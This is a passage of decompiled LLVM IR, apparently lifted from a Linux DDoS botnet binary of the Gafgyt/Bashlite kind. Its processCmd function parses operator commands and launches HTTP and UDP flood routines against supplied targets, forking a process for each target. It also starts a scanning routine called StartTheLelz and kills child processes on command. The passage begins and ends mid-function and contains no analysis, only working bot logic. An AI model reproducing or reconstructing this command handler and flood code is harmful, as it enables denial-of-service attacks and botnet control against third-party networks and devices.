  uselistorder i32* %stack_var_-92, { 1, 0 }
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 1, 0 }
  uselistorder i32 (i32)* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 -16, { 1, 0, 3, 2, 5, 4, 6 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_100059d4, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_100058c4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10005850, { 1, 0 }
  uselistorder label %dec_label_pc_100057c8, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_100056a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000552c, { 1, 0 }
  uselistorder label %dec_label_pc_1000542c, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_10005a34 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_10011c98.28 to i32), i32* @r4, align 4
  %v3_10005a44 = inttoptr i32 %v2_10005a34 to i8*
  %v4_10005a44 = call i32 @__GI_strcoll(i8* %v3_10005a44, i32 ptrtoint ([5 x i8]* @global_var_10011c98.28 to i32))
  %v3_10005a4c = icmp eq i32 %v4_10005a44, 0
  br i1 %v3_10005a4c, label %dec_label_pc_10005a54, label %dec_label_pc_10005a74

dec_label_pc_10005a54:                            ; preds = %entry
  %v3_10005a58 = load i32, i32* @global_var_10024a28.27, align 4
  store i32 ptrtoint (i32* @global_var_10005a70.479 to i32), i32* @lr, align 4
  %v5_10005a6c = call i32 @Rootsprintf(i32 %v3_10005a58, i32 ptrtoint ([6 x i8]* @global_var_1001202c.478 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_10006668

dec_label_pc_10005a74:                            ; preds = %entry
  %v2_10005a78 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_10012034.480 to i32), i32* @r4, align 4
  %v3_10005a88 = inttoptr i32 %v2_10005a78 to i8*
  %v4_10005a88 = call i32 @__GI_strcoll(i8* %v3_10005a88, i32 ptrtoint ([6 x i8]* @global_var_10012034.480 to i32))
  %v3_10005a90 = icmp eq i32 %v4_10005a88, 0
  br i1 %v3_10005a90, label %dec_label_pc_10005a98, label %dec_label_pc_10005ba0

dec_label_pc_10005a98:                            ; preds = %dec_label_pc_10005a74
  %v1_10005a9c = add i32 %tmp, 4
  %v1_10005aa0 = inttoptr i32 %v1_10005a9c to i32*
  %v2_10005aa0 = load i32, i32* %v1_10005aa0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1001203c.481 to i32), i32* @r4, align 4
  %v3_10005ab0 = inttoptr i32 %v2_10005aa0 to i8*
  %v4_10005ab0 = call i32 @__GI_strcoll(i8* %v3_10005ab0, i32 ptrtoint ([4 x i8]* @global_var_1001203c.481 to i32))
  %v3_10005ab8 = icmp eq i32 %v4_10005ab0, 0
  br i1 %v3_10005ab8, label %dec_label_pc_10005ac0, label %dec_label_pc_10005b0c

dec_label_pc_10005ac0:                            ; preds = %dec_label_pc_10005a98
  %v3_10005ac4 = load i32, i32* @global_var_10024a58.482, align 4
  %v3_10005ac8 = icmp eq i32 %v3_10005ac4, 0
  br i1 %v3_10005ac8, label %dec_label_pc_10006668, label %dec_label_pc_10005ad0

dec_label_pc_10005ad0:                            ; preds = %dec_label_pc_10005ac0
  store i32 268458724, i32* @lr, align 4
  %v2_10005ae0 = call i32 @kill(i32 %v3_10005ac4, i32 9)
  %v3_10005ae8 = load i32, i32* @global_var_10024a28.27, align 4
  store i32 268458752, i32* @lr, align 4
  %v5_10005afc = call i32 @Rootsprintf(i32 %v3_10005ae8, i32 ptrtoint ([14 x i8]* @global_var_10012040.483 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  store i32 0, i32* @global_var_10024a58.482, align 4
  br label %dec_label_pc_10005b0c

dec_label_pc_10005b0c:                            ; preds = %dec_label_pc_10005a98, %dec_label_pc_10005ad0
  %v2_10005b14 = load i32, i32* %v1_10005aa0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10012050.484 to i32), i32* @r4, align 4
  %v3_10005b24 = inttoptr i32 %v2_10005b14 to i8*
  %v4_10005b24 = call i32 @__GI_strcoll(i8* %v3_10005b24, i32 ptrtoint ([3 x i8]* @global_var_10012050.484 to i32))
  %v3_10005b2c = icmp eq i32 %v4_10005b24, 0
  br i1 %v3_10005b2c, label %dec_label_pc_10005b34, label %dec_label_pc_10005ba0

dec_label_pc_10005b34:                            ; preds = %dec_label_pc_10005b0c
  %v3_10005b38 = load i32, i32* @global_var_10024a58.482, align 4
  %v3_10005b3c = icmp eq i32 %v3_10005b38, 0
  br i1 %v3_10005b3c, label %dec_label_pc_10005b44, label %dec_label_pc_10006668

dec_label_pc_10005b44:                            ; preds = %dec_label_pc_10005b34
  store i32 268458824, i32* @lr, align 4
  %v0_10005b44 = call i32 @__libc_fork()
  %v3_10005b64 = icmp eq i32 %v0_10005b44, 0
  br i1 %v3_10005b64, label %dec_label_pc_10005b7c, label %dec_label_pc_10005b6c

dec_label_pc_10005b6c:                            ; preds = %dec_label_pc_10005b44
  store i32 %v0_10005b44, i32* @global_var_10024a58.482, align 4
  br label %dec_label_pc_10006668

dec_label_pc_10005b7c:                            ; preds = %dec_label_pc_10005b44
  %v3_10005b94 = call i32 @StartTheLelz(i32 10, i32 1000, i32 -1)
  %v1_10005b9c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10005ba0

dec_label_pc_10005ba0:                            ; preds = %dec_label_pc_10005b0c, %dec_label_pc_10005a74, %dec_label_pc_10005b7c
  %v2_10005ba4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_10012054.486 to i32), i32* @r4, align 4
  %v3_10005bb4 = inttoptr i32 %v2_10005ba4 to i8*
  %v4_10005bb4 = call i32 @__GI_strcoll(i8* %v3_10005bb4, i32 ptrtoint ([5 x i8]* @global_var_10012054.486 to i32))
  %v3_10005bbc = icmp eq i32 %v4_10005bb4, 0
  br i1 %v3_10005bbc, label %dec_label_pc_10005bc4, label %dec_label_pc_10005d38

dec_label_pc_10005bc4:                            ; preds = %dec_label_pc_10005ba0
  %tmp81 = icmp slt i32 %arg1, 6
  br i1 %tmp81, label %dec_label_pc_10006668, label %dec_label_pc_10005bd0

dec_label_pc_10005bd0:                            ; preds = %dec_label_pc_10005bc4
  %v1_10005bd4 = add i32 %tmp, 12
  %v1_10005bd8 = inttoptr i32 %v1_10005bd4 to i32*
  %v2_10005bd8 = load i32, i32* %v1_10005bd8, align 4
  store i32 268458980, i32* @lr, align 4
  %v2_10005be0 = call i32 @atol(i32 %v2_10005bd8, i32 %v1_10005bd4)
  %tmp82 = icmp slt i32 %v2_10005be0, 1
  br i1 %tmp82, label %dec_label_pc_10006668, label %dec_label_pc_10005bf0

dec_label_pc_10005bf0:                            ; preds = %dec_label_pc_10005bd0
  %v1_10005bf4 = add i32 %tmp, 20
  %v1_10005bf8 = inttoptr i32 %v1_10005bf4 to i32*
  %v2_10005bf8 = load i32, i32* %v1_10005bf8, align 4
  store i32 268459012, i32* @lr, align 4
  %v2_10005c00 = call i32 @atol(i32 %v2_10005bf8, i32 %v1_10005bf4)
  %v2_10005c08 = icmp sgt i32 %v2_10005c00, 0
  br i1 %v2_10005c08, label %dec_label_pc_10005c14, label %dec_label_pc_10006668

dec_label_pc_10005c14:                            ; preds = %dec_label_pc_10005bf0
  store i32 268459032, i32* @lr, align 4
  %v0_10005c14 = call i32 @listFork()
  %v3_10005c1c = icmp eq i32 %v0_10005c14, 0
  br i1 %v3_10005c1c, label %dec_label_pc_10005c24, label %dec_label_pc_10006668

dec_label_pc_10005c24:                            ; preds = %dec_label_pc_10005c14
  %v3_10005c28 = load i32, i32* @global_var_10024a28.27, align 4
  store i32 %v3_10005c28, i32* @r29, align 4
  %v1_10005c30 = add i32 %tmp, 4
  %v1_10005c34 = inttoptr i32 %v1_10005c30 to i32*
  %v1_10005c3c = add i32 %tmp, 8
  %v1_10005c40 = inttoptr i32 %v1_10005c3c to i32*
  %v2_10005c40 = load i32, i32* %v1_10005c40, align 4
  store i32 %v2_10005c40, i32* @r27, align 4
  %v2_10005c4c = load i32, i32* %v1_10005bd8, align 4
  store i32 268459096, i32* @lr, align 4
  %v2_10005c54 = call i32 @atol(i32 %v2_10005c4c, i32 %v1_10005bd4)
  %v2_10005c64 = load i32, i32* %v1_10005bf8, align 4
  store i32 268459120, i32* @lr, align 4
  %v2_10005c6c = call i32 @atol(i32 %v2_10005c64, i32 %v1_10005bf4)
  %v0_10005c74 = load i32, i32* @r29, align 4
  %v0_10005c80 = load i32, i32* @r28, align 4
  store i32 268459160, i32* @lr, align 4
  %v8_10005c94 = call i32 @Rootsprintf(i32 %v0_10005c74, i32 ptrtoint ([38 x i8]* @global_var_1001205c.487 to i32), i32 %v0_10005c80)
  %v2_10005ca0 = load i32, i32* %v1_10005c34, align 4
  store i32 %v2_10005ca0, i32* @r29, align 4
  %v2_10005cc0 = load i32, i32* %v1_10005bd8, align 4
  store i32 268459212, i32* @lr, align 4
  %v2_10005cc8 = call i32 @atol(i32 %v2_10005cc0, i32 %v1_10005bd4)
  %v1_10005cd0 = urem i32 %v2_10005cc8, 65536
  store i32 %v1_10005cd0, i32* @r27, align 4
  %v2_10005cec = load i32, i32* %v1_10005bf8, align 4
  store i32 268459256, i32* @lr, align 4
  %v2_10005cf4 = call i32 @atol(i32 %v2_10005cec, i32 %v1_10005bf4)
  %v1_10005d00 = add i32 %tmp, 24
  %v1_10005d04 = inttoptr i32 %v1_10005d00 to i32*
  %v2_10005d04 = load i32, i32* %v1_10005d04, align 4
  store i32 268459280, i32* @lr, align 4
  %v2_10005d0c = call i32 @atol(i32 %v2_10005d04, i32 %v1_10005d00)
  %v0_10005d14 = load i32, i32* @r29, align 4
  %v0_10005d18 = load i32, i32* @r28, align 4
  %v0_10005d1c = load i32, i32* @r27, align 4
  %v0_10005d20 = load i32, i32* @r26, align 4
  %v0_10005d24 = load i32, i32* @r25, align 4
  %v6_10005d2c = trunc i32 %v0_10005d1c to i16
  %v7_10005d2c = call i32 @sendHTTP(i32 %v0_10005d14, i32 %v0_10005d18, i16 %v6_10005d2c, i32 %v0_10005d20, i32 %v0_10005d24, i32 %v2_10005d0c)
  %v0_10005d34 = call i32 @__GI_exit()
  br label %dec_label_pc_10005d38

dec_label_pc_10005d38:                            ; preds = %dec_label_pc_10005ba0, %dec_label_pc_10005c24
  %v2_10005d3c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_10012084.489 to i32), i32* @r4, align 4
  %v3_10005d4c = inttoptr i32 %v2_10005d3c to i8*
  %v4_10005d4c = call i32 @__GI_strcoll(i8* %v3_10005d4c, i32 ptrtoint ([4 x i8]* @global_var_10012084.489 to i32))
  %v3_10005d54 = icmp eq i32 %v4_10005d4c, 0
  br i1 %v3_10005d54, label %dec_label_pc_10005d5c, label %dec_label_pc_100060c0

dec_label_pc_10005d5c:                            ; preds = %dec_label_pc_10005d38
  %tmp83 = icmp slt i32 %arg1, 6
  br i1 %tmp83, label %dec_label_pc_10005e90, label %dec_label_pc_10005d68

dec_label_pc_10005d68:                            ; preds = %dec_label_pc_10005d5c
  %v1_10005d6c = add i32 %tmp, 12
  %v1_10005d70 = inttoptr i32 %v1_10005d6c to i32*
  %v2_10005d70 = load i32, i32* %v1_10005d70, align 4
  store i32 268459388, i32* @lr, align 4
  %v2_10005d78 = call i32 @atol(i32 %v2_10005d70, i32 %v1_10005d6c)
  %v4_10005d84 = icmp eq i32 %v2_10005d78, -1
  br i1 %v4_10005d84, label %dec_label_pc_10005e90, label %dec_label_pc_10005d8c

dec_label_pc_10005d8c:                            ; preds = %dec_label_pc_10005d68
  %v1_10005d90 = add i32 %tmp, 8
  %v1_10005d94 = inttoptr i32 %v1_10005d90 to i32*
  %v2_10005d94 = load i32, i32* %v1_10005d94, align 4
  store i32 268459424, i32* @lr, align 4
  %v2_10005d9c = call i32 @atol(i32 %v2_10005d94, i32 %v1_10005d90)
  %v4_10005da8 = icmp eq i32 %v2_10005d9c, -1
  br i1 %v4_10005da8, label %dec_label_pc_10005e90, label %dec_label_pc_10005db0

dec_label_pc_10005db0:                            ; preds = %dec_label_pc_10005d8c
  %v1_10005db4 = add i32 %tmp, 16
  %v1_10005db8 = inttoptr i32 %v1_10005db4 to i32*
  %v2_10005db8 = load i32, i32* %v1_10005db8, align 4
  store i32 268459460, i32* @lr, align 4
  %v2_10005dc0 = call i32 @atol(i32 %v2_10005db8, i32 %v1_10005db4)
  %v4_10005dcc = icmp eq i32 %v2_10005dc0, -1
  br i1 %v4_10005dcc, label %dec_label_pc_10005e90, label %dec_label_pc_10005dd4

dec_label_pc_10005dd4:                            ; preds = %dec_label_pc_10005db0
  %v1_10005dd8 = add i32 %tmp, 20
  %v1_10005ddc = inttoptr i32 %v1_10005dd8 to i32*
  %v2_10005ddc = load i32, i32* %v1_10005ddc, align 4
  store i32 268459496, i32* @lr, align 4
  %v2_10005de4 = call i32 @atol(i32 %v2_10005ddc, i32 %v1_10005dd8)
  %v4_10005df0 = icmp eq i32 %v2_10005de4, -1
  br i1 %v4_10005df0, label %dec_label_pc_10005e90, label %dec_label_pc_10005df8

dec_label_pc_10005df8:                            ; preds = %dec_label_pc_10005dd4
  %v2_10005e00 = load i32, i32* %v1_10005ddc, align 4
  store i32 268459532, i32* @lr, align 4
  %v2_10005e08 = call i32 @atol(i32 %v2_10005e00, i32 %v1_10005dd8)
  %v3_10005e14 = icmp sgt i32 %v2_10005e08, 65536
  br i1 %v3_10005e14, label %dec_label_pc_10005e90, label %dec_label_pc_10005e1c

dec_label_pc_10005e1c:                            ; preds = %dec_label_pc_10005df8
  %v2_10005e24 = load i32, i32* %v1_10005ddc, align 4
  store i32 268459568, i32* @lr, align 4
  %v2_10005e2c = call i32 @atol(i32 %v2_10005e24, i32 %v1_10005dd8)
  %v3_10005e3c = icmp sgt i32 %v2_10005e2c, 65500
  br i1 %v3_10005e3c, label %dec_label_pc_10005e90, label %dec_label_pc_10005e44

dec_label_pc_10005e44:                            ; preds = %dec_label_pc_10005e1c
  %v2_10005e4c = load i32, i32* %v1_10005db8, align 4
  store i32 268459608, i32* @lr, align 4
  %v2_10005e54 = call i32 @atol(i32 %v2_10005e4c, i32 %v1_10005db4)
  %v2_10005e5c = icmp sgt i32 %v2_10005e54, 32
  br i1 %v2_10005e5c, label %dec_label_pc_10005e90, label %dec_label_pc_10005e64

dec_label_pc_10005e64:                            ; preds = %dec_label_pc_10005e44
  %v1_10005e68 = icmp slt i32 %arg1, 7
  %v3_10005e68 = icmp eq i32 %arg1, 7
  br i1 %v3_10005e68, label %dec_label_pc_10005e70, label %dec_label_pc_10005eb0

dec_label_pc_10005e70:                            ; preds = %dec_label_pc_10005e64
  %v1_10005e74 = add i32 %tmp, 24
  %v1_10005e78 = inttoptr i32 %v1_10005e74 to i32*
  %v2_10005e78 = load i32, i32* %v1_10005e78, align 4
  store i32 268459652, i32* @lr, align 4
  %v2_10005e80 = call i32 @atol(i32 %v2_10005e78, i32 %v1_10005e74)
  %v2_10005e88 = icmp sgt i32 %v2_10005e80, 0
  br i1 %v2_10005e88, label %dec_label_pc_10005eb0, label %dec_label_pc_10005e90

dec_label_pc_10005e90:                            ; preds = %dec_label_pc_10005e70, %dec_label_pc_10005e44, %dec_label_pc_10005e1c, %dec_label_pc_10005df8, %dec_label_pc_10005dd4, %dec_label_pc_10005db0, %dec_label_pc_10005d8c, %dec_label_pc_10005d68, %dec_label_pc_10005d5c
  %v3_10005e94 = load i32, i32* @global_var_10024a28.27, align 4
  store i32 ptrtoint (i32* @global_var_10005eac.491 to i32), i32* @lr, align 4
  %v5_10005ea8 = call i32 @Rootsprintf(i32 %v3_10005e94, i32 ptrtoint ([113 x i8]* @global_var_10012088.490 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_10006668

dec_label_pc_10005eb0:                            ; preds = %dec_label_pc_10005e64, %dec_label_pc_10005e70
  %v1_10005eb4 = add i32 %tmp, 4
  %v1_10005eb8 = inttoptr i32 %v1_10005eb4 to i32*
  %v2_10005eb8 = load i32, i32* %v1_10005eb8, align 4
  %v2_10005ec8 = load i32, i32* %v1_10005d94, align 4
  store i32 268459732, i32* @lr, align 4
  %v2_10005ed0 = call i32 @atol(i32 %v2_10005ec8, i32 %v1_10005d90)
  %v2_10005ee4 = load i32, i32* %v1_10005d70, align 4
  store i32 268459760, i32* @lr, align 4
  %v2_10005eec = call i32 @atol(i32 %v2_10005ee4, i32 %v1_10005d6c)
  %v2_10005f00 = load i32, i32* %v1_10005db8, align 4
  store i32 268459788, i32* @lr, align 4
  %v2_10005f08 = call i32 @atol(i32 %v2_10005f00, i32 %v1_10005db4)
  %v2_10005f1c = load i32, i32* %v1_10005ddc, align 4
  store i32 268459816, i32* @lr, align 4
  %v2_10005f24 = call i32 @atol(i32 %v2_10005f1c, i32 %v1_10005dd8)
  br i1 %v1_10005e68, label %dec_label_pc_10005f60.thread, label %dec_label_pc_10005f60

dec_label_pc_10005f60.thread:                     ; preds = %dec_label_pc_10005eb0
  br label %dec_label_pc_10005f90

dec_label_pc_10005f60:                            ; preds = %dec_label_pc_10005eb0
  %v1_10005f40 = add i32 %tmp, 24
  %v1_10005f44 = inttoptr i32 %v1_10005f40 to i32*
  %v2_10005f44 = load i32, i32* %v1_10005f44, align 4
  store i32 268459856, i32* @lr, align 4
  %v2_10005f4c = call i32 @atol(i32 %v2_10005f44, i32 %v1_10005f40)
  br i1 %v3_10005e68, label %dec_label_pc_10005f90, label %dec_label_pc_10005f74

dec_label_pc_10005f74:                            ; preds = %dec_label_pc_10005f60
  %v1_10005f78 = add i32 %tmp, 28
  %v1_10005f7c = inttoptr i32 %v1_10005f78 to i32*
  %v2_10005f7c = load i32, i32* %v1_10005f7c, align 4
  store i32 268459912, i32* @lr, align 4
  %v2_10005f84 = call i32 @atol(i32 %v2_10005f7c, i32 %v1_10005f78)
  br label %dec_label_pc_10005fa4

dec_label_pc_10005f90:                            ; preds = %dec_label_pc_10005f60.thread, %dec_label_pc_10005f60
  %storemerge817 = phi i32 [ 1000, %dec_label_pc_10005f60.thread ], [ %v2_10005f4c, %dec_label_pc_10005f60 ]
  br label %dec_label_pc_10005fa4

dec_label_pc_10005fa4:                            ; preds = %dec_label_pc_10005f74, %dec_label_pc_10005f90
  %storemerge816 = phi i32 [ %storemerge817, %dec_label_pc_10005f90 ], [ %v2_10005f4c, %dec_label_pc_10005f74 ]
  %storemerge7 = phi i32 [ 1000000, %dec_label_pc_10005f90 ], [ %v2_10005f84, %dec_label_pc_10005f74 ]
  %tmp85 = icmp slt i32 %arg1, 9
  br i1 %tmp85, label %dec_label_pc_10005fd4, label %dec_label_pc_10005fb8

dec_label_pc_10005fb8:                            ; preds = %dec_label_pc_10005fa4
  %v1_10005fbc = add i32 %tmp, 32
  %v1_10005fc0 = inttoptr i32 %v1_10005fbc to i32*
  %v2_10005fc0 = load i32, i32* %v1_10005fc0, align 4
  store i32 268459980, i32* @lr, align 4
  %v2_10005fc8 = call i32 @atol(i32 %v2_10005fc0, i32 %v1_10005fbc)
  br label %dec_label_pc_10005fdc

dec_label_pc_10005fd4:                            ; preds = %dec_label_pc_10005fa4
  br label %dec_label_pc_10005fdc

dec_label_pc_10005fdc:                            ; preds = %dec_label_pc_10005fb8, %dec_label_pc_10005fd4
  %storemerge6 = phi i32 [ 0, %dec_label_pc_10005fd4 ], [ %v2_10005fc8, %dec_label_pc_10005fb8 ]
  store i32 %v2_10005eb8, i32* @r3, align 4
  store i32 268460020, i32* @lr, align 4
  %v2_10005ff0 = call i32 @__GI_strchr(i32 %v2_10005eb8, i32 44)
  %v3_10005ff8 = icmp eq i32 %v2_10005ff0, 0
  br i1 %v3_10005ff8, label %dec_label_pc_10006084, label %dec_label_pc_10006000

dec_label_pc_10006000:                            ; preds = %dec_label_pc_10005fdc
  store i32 ptrtoint (i32* @global_var_10012000.470 to i32), i32* @r4, align 4
  store i32 268460052, i32* @lr, align 4
  %v4_10006010 = call i32 @__GI_strtok(i32 %v2_10005eb8, i32 ptrtoint (i32* @global_var_10012000.470 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  %v3_1000607829 = icmp eq i32 %v4_10006010, 0
  br i1 %v3_1000607829, label %dec_label_pc_10006668, label %dec_label_pc_10006020

dec_label_pc_10006020:                            ; preds = %dec_label_pc_10006000, %dec_label_pc_1000605c
  %storemerge1530 = phi i32 [ %v4_10006068, %dec_label_pc_1000605c ], [ %v4_10006010, %dec_label_pc_10006000 ]
  store i32 268460068, i32* @lr, align 4
  %v0_10006020 = call i32 @listFork()
  %v3_10006028 = icmp eq i32 %v0_10006020, 0
  br i1 %v3_10006028, label %dec_label_pc_10006030, label %dec_label_pc_1000605c

dec_label_pc_10006030:                            ; preds = %dec_label_pc_10006020
  store i32 %storemerge6, i32* @r10, align 4
  %v7_10006050 = call i32 @sendUDP(i32 %storemerge1530, i32 %v2_10005ed0, i32 %v2_10005eec, i32 %v2_10005f08, i32 %v2_10005f24, i32 %storemerge816, i32 %storemerge7)
  %v1_10006058 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000605c

dec_label_pc_1000605c:                            ; preds = %dec_label_pc_10006020, %dec_label_pc_10006030
  store i32 ptrtoint (i32* @global_var_10012000.470 to i32), i32* @r4, align 4
  store i32 268460140, i32* @lr, align 4
  %v4_10006068 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10012000.470 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  %v3_10006078 = icmp eq i32 %v4_10006068, 0
  br i1 %v3_10006078, label %dec_label_pc_10006668, label %dec_label_pc_10006020

dec_label_pc_10006084:                            ; preds = %dec_label_pc_10005fdc
  store i32 268460168, i32* @lr, align 4
  %v0_10006084 = call i32 @listFork()
  %v3_1000608c = icmp eq i32 %v0_10006084, 0
  br i1 %v3_1000608c, label %dec_label_pc_10006094, label %dec_label_pc_10006668

dec_label_pc_10006094:                            ; preds = %dec_label_pc_10006084
  store i32 %storemerge6, i32* @r10, align 4
  %v7_100060b4 = call i32 @sendUDP(i32 %v2_10005eb8, i32 %v2_10005ed0, i32 %v2_10005eec, i32 %v2_10005f08, i32 %v2_10005f24, i32 %storemerge816, i32 %storemerge7)
  %v1_100060bc = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_100060c0

dec_label_pc_100060c0:                            ; preds = %dec_label_pc_10005d38, %dec_label_pc_10006094
  %v2_100060c4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_100120fc.495 to i32), i32* @r4, align 4
  %v3_100060d4 = inttoptr i32 %v2_100060c4 to i8*
  %v4_100060d4 = call i32 @__GI_strcoll(i8* %v3_100060d4, i32 ptrtoint ([4 x i8]* @global_var_100120fc.495 to i32))
  %v3_100060dc = icmp eq i32 %v4_100060d4, 0
  br i1 %v3_100060dc, label %dec_label_pc_100060e4, label %dec_label_pc_100063ac

dec_label_pc_100060e4:                            ; preds = %dec_label_pc_100060c0
  %tmp86 = icmp slt i32 %arg1, 6
  br i1 %tmp86, label %dec_label_pc_100061d4, label %dec_label_pc_100060f0

dec_label_pc_100060f0:                            ; preds = %dec_label_pc_100060e4
  %v1_100060f4 = add i32 %tmp, 12
  %v1_100060f8 = inttoptr i32 %v1_100060f4 to i32*
  %v2_100060f8 = load i32, i32* %v1_100060f8, align 4
  store i32 268460292, i32* @lr, align 4
  %v2_10006100 = call i32 @atol(i32 %v2_100060f8, i32 %v1_100060f4)
  %v4_1000610c = icmp eq i32 %v2_10006100, -1
  br i1 %v4_1000610c, label %dec_label_pc_100061d4, label %dec_label_pc_10006114

dec_label_pc_10006114:                            ; preds = %dec_label_pc_100060f0
  %v1_10006118 = add i32 %tmp, 8
  %v1_1000611c = inttoptr i32 %v1_10006118 to i32*
  %v2_1000611c = load i32, i32* %v1_1000611c, align 4
  store i32 268460328, i32* @lr, align 4
  %v2_10006124 = call i32 @atol(i32 %v2_1000611c, i32 %v1_10006118)
  %v4_10006130 = icmp eq i32 %v2_10006124, -1
  br i1 %v4_10006130, label %dec_label_pc_100061d4, label %dec_label_pc_10006138

dec_label_pc_10006138:                            ; preds = %dec_label_pc_10006114
  %v1_1000613c = add i32 %tmp, 16
  %v1_10006140 = inttoptr i32 %v1_1000613c to i32*
  %v2_10006140 = load i32, i32* %v1_10006140, align 4
  store i32 268460364, i32* @lr, align 4
  %v2_10006148 = call i32 @atol(i32 %v2_10006140, i32 %v1_1000613c)
  %v4_10006154 = icmp eq i32 %v2_10006148, -1
  br i1 %v4_10006154, label %dec_label_pc_100061d4, label %dec_label_pc_1000615c

dec_label_pc_1000615c:                            ; preds = %dec_label_pc_10006138
  %v2_10006164 = load i32, i32* %v1_10006140, align 4
  store i32 268460400, i32* @lr, align 4
  %v2_1000616c = call i32 @atol(i32 %v2_10006164, i32 %v1_1000613c)
  %v2_10006174 = icmp sgt i32 %v2_1000616c, 32
  br i1 %v2_10006174, label %dec_label_pc_100061d4, label %dec_label_pc_1000617c

dec_label_pc_1000617c:                            ; preds = %dec_label_pc_1000615c
  %tmp87 = icmp slt i32 %arg1, 7
  br i1 %tmp87, label %dec_label_pc_100061a8, label %dec_label_pc_10006188

dec_label_pc_10006188:                            ; preds = %dec_label_pc_1000617c
  %v1_1000618c = add i32 %tmp, 24
  %v1_10006190 = inttoptr i32 %v1_1000618c to i32*
  %v2_10006190 = load i32, i32* %v1_10006190, align 4
  store i32 268460444, i32* @lr, align 4
  %v2_10006198 = call i32 @atol(i32 %v2_10006190, i32 %v1_1000618c)
  %v1_100061a0 = icmp slt i32 %v2_10006198, 0
  br i1 %v1_100061a0, label %dec_label_pc_100061d4, label %dec_label_pc_100061a8

dec_label_pc_100061a8:                            ; preds = %dec_label_pc_10006188, %dec_label_pc_1000617c
  %v3_100061ac = icmp eq i32 %arg1, 8
  br i1 %v3_100061ac, label %dec_label_pc_100061b4, label %dec_label_pc_100061f4

dec_label_pc_100061b4:                            ; preds = %dec_label_pc_100061a8
  %v1_100061b8 = add i32 %tmp, 28
  %v1_100061bc = inttoptr i32 %v1_100061b8 to i32*
  %v2_100061bc = load i32, i32* %v1_100061bc, align 4
  store i32 268460488, i32* @lr, align 4
  %v2_100061c4 = call i32 @atol(i32 %v2_100061bc, i32 %v1_100061b8)
  %v2_100061cc = icmp sgt i32 %v2_100061c4, 0
  br i1 %v2_100061cc, label %dec_label_pc_100061f4, label %dec_label_pc_100061d4

dec_label_pc_100061d4:                            ; preds = %dec_label_pc_100061b4, %dec_label_pc_10006188, %dec_label_pc_1000615c, %dec_label_pc_10006138, %dec_label_pc_10006114, %dec_label_pc_100060f0, %dec_label_pc_100060e4
  %v3_100061d8 = load i32, i32* @global_var_10024a28.27, align 4
  store i32 ptrtoint (i32* @global_var_100061f0.497 to i32), i32* @lr, align 4
  %v5_100061ec = call i32 @Rootsprintf(i32 %v3_100061d8, i32 ptrtoint ([186 x i8]* @global_var_10012100.496 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_10006668

dec_label_pc_100061f4:                            ; preds = %dec_label_pc_100061a8, %dec_label_pc_100061b4
  %v1_100061f8 = add i32 %tmp, 4
  %v1_100061fc = inttoptr i32 %v1_100061f8 to i32*
  %v2_100061fc = load i32, i32* %v1_100061fc, align 4
  %v2_1000620c = load i32, i32* %v1_1000611c, align 4
  store i32 268460568, i32* @lr, align 4
  %v2_10006214 = call i32 @atol(i32 %v2_1000620c, i32 %v1_10006118)
  %v2_10006228 = load i32, i32* %v1_100060f8, align 4
  store i32 268460596, i32* @lr, align 4
  %v2_10006230 = call i32 @atol(i32 %v2_10006228, i32 %v1_100060f4)
  %v2_10006244 = load i32, i32* %v1_10006140, align 4
  store i32 268460624, i32* @lr, align 4
  %v2_1000624c = call i32 @atol(i32 %v2_10006244, i32 %v1_1000613c)
  %v1_1000625c = add i32 %tmp, 20
  %v1_10006260 = inttoptr i32 %v1_1000625c to i32*
  %v2_10006260 = load i32, i32* %v1_10006260, align 4
  br i1 %v3_100061ac, label %dec_label_pc_10006274, label %dec_label_pc_10006290

dec_label_pc_10006274:                            ; preds = %dec_label_pc_100061f4
  %v1_10006278 = add i32 %tmp, 28
  %v1_1000627c = inttoptr i32 %v1_10006278 to i32*
  %v2_1000627c = load i32, i32* %v1_1000627c, align 4
  store i32 268460680, i32* @lr, align 4
  %v2_10006284 = call i32 @atol(i32 %v2_1000627c, i32 %v1_10006278)
  br label %dec_label_pc_10006298

dec_label_pc_10006290:                            ; preds = %dec_label_pc_100061f4
  br label %dec_label_pc_10006298

dec_label_pc_10006298:                            ; preds = %dec_label_pc_10006274, %dec_label_pc_10006290
  %storemerge5 = phi i32 [ 10, %dec_label_pc_10006290 ], [ %v2_10006284, %dec_label_pc_10006274 ]
  br i1 %tmp87, label %dec_label_pc_100062c8, label %dec_label_pc_100062ac

